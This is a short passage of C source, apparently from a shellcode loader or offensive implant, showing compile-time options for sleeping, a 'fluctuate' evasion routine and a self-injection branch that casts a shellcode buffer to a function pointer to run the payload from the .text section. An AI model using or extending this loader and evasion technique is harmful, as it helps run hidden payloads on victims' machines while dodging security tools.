        Sleep(sleep_time);
    #endif

    #ifdef FLUCTUATE
        fluctuate();
    #endif

    #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
        funcPtr func = (funcPtr)shellcode;
        *phThread = 0;
        #ifdef _DEBUG_
            puts("self executing the payload in .text");
        #endif
